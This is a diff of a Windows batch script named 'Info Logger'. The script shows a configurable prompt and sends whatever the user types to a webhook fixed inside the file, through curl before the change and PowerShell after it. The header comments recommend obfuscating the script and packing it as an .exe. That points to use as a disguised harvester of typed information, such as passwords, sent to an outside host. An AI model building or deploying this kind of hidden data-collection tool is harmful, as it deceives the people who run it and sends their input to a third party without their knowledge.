@@ -1,25 +1,38 @@
 :: Coded by @DARKNOSY (https://github.com/DARKNOSY/Info-Logger)
 :: I recommend using Bat2ExeXobfuscator for obfuscating and making this modified file a .exe (https://github.com/DARKNOSY/Bat2ExeXobfuscator)
-@echo off & cls
+@echo off
+cls
 color 5
 
-set t="Info Logger/@DARKNOSY"
-:: title for console
-title %t%
-set message-after=Don't forget to check out the code, it contains all the information you need to modify it to your needs
-::message after post request to webhook is successful
-set question-asked=Your Webhook
-:: put question instead of "Your Webhook"
-set /p webhook="%question-asked%:  "
-::if you want to set your own webhook and make it so it doesn't ask for the webhook replace "set /p webhook="WebHook:  "" by "set webhook=WEBHOOK-HERE" and replace "WEBHOOK-HERE" by your webhook link
-set /p message="Message:  "
-:: the text entered is then sent to the set webhook link (you can replace the question)
-set avatar_url=https://avatars.githubusercontent.com/u/109553205?v=4
-:: webhook avatar url
-set name="Batch Info Logger / @DARKNOSY"
-:: webhook name
+setlocal EnableDelayedExpansion
 
-curl -H "Content-Type: application/json" -d "{\"username\": \"%name%\", \"content\":\"%question-asked%:  %message%\", \"avatar_url\":\"%avatar_url%\"}" %webhook% >nul & echo %message-after%
-:: send post request to the set webhook
+set t=Info Logger/@DARKNOSY
+:: title for console
+title !t!
+set message-after=Don't forget to check out the code. It contains all the information you need to modify it to your needs.
+:: message after post request to webhook is successful
+set message-AFTER=Error.
+:: message after post request to webhook is unsuccessful
+set question-asked=INSERT-QUESTION-HERE
+:: put question instead of "INSERT-QUESTION-HERE" (don't use ' or any related symbols in the question)
+set webhook_url=INSERT-WEBHOOK-HERE
+:: insert you webhook link instead of INSERT-WEBHOOK-HERE
+set /p content="!question-asked!:  "
+
+set banner=https://avatars.githubusercontent.com/u/109553205?v=4
+:: webhook embeded banner
+
+set "payload={\"embeds\": [{\"author\": {\"name\": \"!question-asked!\"}, \"image\": {\"url\": \"!banner!\"}, \"description\": \"!content!\"}]}"
+set "payload=!payload:"=^"!"
+
+powershell -Command "$payload = '%payload%'; Invoke-RestMethod -Uri '%webhook_url%' -Method Post -ContentType 'application/json' -Body $payload"
+
+if %errorlevel% equ 0 (
+    echo %message-after%
+) else (
+    echo %message-AFTER%
+)
+
 pause
+endlocal
 exit
